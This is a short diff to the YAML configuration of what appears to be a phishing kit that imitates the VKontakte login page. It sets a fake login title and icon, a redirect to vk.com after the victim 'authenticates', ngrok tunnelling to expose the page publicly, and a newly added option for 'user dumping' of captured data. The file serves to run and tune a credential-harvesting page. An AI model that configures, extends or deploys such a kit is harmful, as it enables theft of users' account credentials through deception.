@@ -1,5 +1,6 @@
 title: Вход | ВКонтакте # Title of page, that will be visible to user
 image: /icon.png # Same as title
 exit: https://vk.com/im # User will go to this page after successful auth
+dump: false # Enable user dumping
 ngrok: # Ngrok config, see https://ngrok.com/docs#config
   region: eu
